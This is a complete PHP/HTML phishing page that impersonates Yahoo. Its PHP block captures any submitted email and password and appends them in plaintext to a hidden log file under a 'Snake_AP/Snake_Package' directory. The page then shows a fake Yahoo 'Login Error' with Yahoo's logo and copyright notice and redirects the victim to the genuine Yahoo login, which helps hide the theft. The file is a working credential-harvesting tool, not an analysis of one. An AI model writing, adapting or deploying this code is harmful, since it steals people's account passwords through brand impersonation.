<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data with fallback defaults
    $email = $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';
    $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';

    // Set up dynamic log file path
    $log_dir = __DIR__ . "/../Snake_AP/Snake_Package/logPHP";
    $log_file = $log_dir . "/login_attempts.log";

    // Create the directory if it doesn't exist
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0755, true);
    }

    // Log the attempt
    error_log("LOGIN ATTEMPT: Domain: $domain | Email: $email | Password: $password\n", 3, $log_file);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo - Login Error</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .error-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo svg {
            width: 120px;
            height: 120px;
        }
        h1 {
            color: #5F01D1;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .error-message {
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .login-btn {
            padding: 12px 24px;
            background-color: #5F01D1;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        .login-btn:hover {
            background-color: #4a00a8;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="logo">
            <svg viewBox="0 -184.5 512 512" xmlns="http://www.w3.org/2000/svg">
                <path d="M0,34.6068096 L30.4746532,34.6068096 L48.1654477,79.9313997 L66.1145019,34.6068096 L95.8143758,34.6068096 L51.1354351,142.042875 L21.3064313,142.042875 L33.5737705,113.6343 L0,34.6068096 Z M126.676419,32.7989912 C103.820429,32.7989912 89.3578815,53.3306431 89.3578815,73.7331652 C89.3578815,96.718285 105.240858,114.925599 126.289029,114.925599 C142.042875,114.925599 147.98285,105.369987 147.98285,105.369987 L147.98285,112.859521 L174.583607,112.859521 L174.583607,34.6068096 L147.98285,34.6068096 L147.98285,41.7089533 C147.85372,41.7089533 141.268096,32.7989912 126.676419,32.7989912 Z M132.358134,57.979319 C142.946784,57.979319 148.37024,66.3727617 148.37024,73.8622951 C148.37024,81.9974779 142.559395,90.0035309 132.358134,90.0035309 C123.964691,90.0035309 116.346028,83.1596469 116.346028,74.2496847 C116.346028,65.2105927 122.415132,57.979319 132.358134,57.979319 Z M183.622699,112.859521 L183.622699,0 L211.385624,0 L211.385624,41.9672131 C211.385624,41.9672131 217.971248,32.7989912 231.788146,32.7989912 C248.704161,32.7989912 258.647163,45.4537201 258.647163,63.4027743 L258.647163,112.859521 L231.013367,112.859521 L231.013367,70.1175284 C231.013367,64.0484237 228.172509,58.1084489 221.586885,58.1084489 C214.872131,58.1084489 211.385624,64.0484237 211.385624,70.1175284 L211.385624,112.859521 L183.622699,112.859521 Z M306.037831,32.7989912 C279.824464,32.7989912 264.199748,52.6849937 264.199748,74.1205549 C264.199748,98.3969735 283.052711,115.054729 306.166961,115.054729 C328.506431,115.054729 348.005044,99.1717528 348.005044,74.5079445 C348.005044,47.5197982 327.473392,32.7989912 306.037831,32.7989912 Z M306.296091,58.1084489 C315.593443,58.1084489 321.920807,65.8562421 321.920807,73.991425 C321.920807,80.9644388 315.980832,89.6161412 306.296091,89.6161412 C297.386129,89.6161412 290.800504,82.5139975 290.800504,73.8622951 C290.800504,65.7271122 296.22396,58.1084489 306.296091,58.1084489 Z M394.233544,32.7989912 C368.020177,32.7989912 352.39546,52.6849937 352.39546,74.1205549 C352.39546,98.3969735 371.248424,115.054729 394.362673,115.054729 C416.702144,115.054729 436.200757,99.1717528 436.200757,74.5079445 C436.200757,47.5197982 415.798235,32.7989912 394.233544,32.7989912 Z M394.491803,58.1084489 C403.789155,58.1084489 410.11652,65.8562421 410.11652,73.991425 C410.11652,80.9644388 404.176545,89.6161412 394.491803,89.6161412 C385.581841,89.6161412 378.996217,82.5139975 378.996217,73.8622951 C378.996217,65.7271122 384.548802,58.1084489 394.491803,58.1084489 Z M458.152837,77.6070618 C468.354098,77.6070618 476.618411,85.8713745 476.618411,96.0726356 C476.618411,106.273897 468.354098,114.538209 458.152837,114.538209 C447.951576,114.538209 439.687264,106.273897 439.687264,96.0726356 C439.687264,85.8713745 447.951576,77.6070618 458.152837,77.6070618 Z M482.687516,70.8923077 L449.501135,70.8923077 L478.942749,7.10542736e-15 L512,7.10542736e-15 L482.687516,70.8923077 Z" fill="#5F01D1"/>
            </svg>
        </div>
        
        <h1>We encountered an error</h1>
        
        <div class="error-message">
            <p>We're having trouble signing you in. Please try again through the official Yahoo login page.</p>
            <p>For your security, we've logged you out of this session.</p>
        </div>
        
        <button class="login-btn" onclick="window.location.href='https://login.yahoo.com/'">
            Go to Yahoo Login
        </button>
        
        <div class="footer">
            <p>© 2024 Yahoo. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
